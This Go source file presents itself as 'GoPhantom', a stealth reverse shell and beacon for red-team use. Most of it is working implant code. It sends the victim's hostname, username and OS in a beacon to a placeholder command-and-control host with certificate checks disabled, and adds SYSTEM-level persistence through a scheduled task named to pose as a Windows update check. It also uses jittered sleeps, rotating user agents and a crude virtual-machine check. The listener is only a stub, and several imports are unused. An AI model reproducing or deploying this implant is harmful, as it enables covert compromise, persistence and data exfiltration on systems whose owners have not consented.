// GoPhantom.go - Advanced Stealth Go Reverse Shell & Beacon
// Hand-coded for authorized red-team testing only
// EPO - Lab / Explicit Permission ONLY! 💀

package main

import (
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

var (
	c2URL         = "https://c2.yourdomain.com:443" // Change or use flag
	jitter        = 0.5
	sleepMin      = 15
	sleepMax      = 90
	userAgents    = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
	}
)

func init() {
	rand.Seed(time.Now().UnixNano())
}

func timestamp() string {
	return time.Now().Format("2006-01-02 15:04:05")
}

func fakeDelay() {
	j := time.Duration(int64(float64(rand.Intn(sleepMax-sleepMin)+sleepMin) * (1 + rand.Float64()*2*jitter- jitter)))
	time.Sleep(j * time.Second)
}

func isWindows() bool {
	return runtime.GOOS == "windows"
}

// Basic VM detect (expand with CPUID)
func isVM() bool {
	if isWindows() {
		// Simple check
		if _, err := os.Stat("C:\\Windows\\System32\\drivers\\vmmouse.sys"); err == nil {
			return true
		}
	}
	return false
}

// Persistence (Windows)
func addPersistence() {
	if !isWindows() {
		return
	}
	cmd := exec.Command("schtasks", "/create", "/tn", "WindowsUpdateCheck", "/tr", os.Args[0]+" beacon "+c2URL, "/sc", "minute", "/mo", "10", "/ru", "SYSTEM", "/f")
	cmd.Run()
}

// Beacon loop
func beacon() {
	fmt.Printf("[%s] GoPhantom beacon starting → %s\n", timestamp(), c2URL)

	for {
		fakeDelay()

		// Gather basic recon
		hostname, _ := os.Hostname()
		user := os.Getenv("USERNAME")
		if user == "" {
			user = os.Getenv("USER")
		}

		req, _ := http.NewRequest("POST", c2URL+"/beacon", strings.NewReader(fmt.Sprintf(`{"h":"%s","u":"%s","o":"%s"}`, hostname, user, runtime.GOOS)))
		req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])

		tr := &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		}
		client := &http.Client{Transport: tr, Timeout: 15 * time.Second}

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()

		// Optional: read task from response headers or body
	}
}

func listener() {
	// Simple TLS listener stub (expand to full C2)
	fmt.Printf("[%s] C2 listener starting on :443\n", timestamp())
	// Implement full listener here or use separate tool
}

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Usage: GoPhantom beacon <c2_url> | listener")
		os.Exit(1)
	}

	mode := os.Args[1]

	if mode == "beacon" {
		if len(os.Args) > 2 {
			c2URL = os.Args[2]
		}
		addPersistence()
		beacon()
	} else if mode == "listener" {
		listener()
	}
}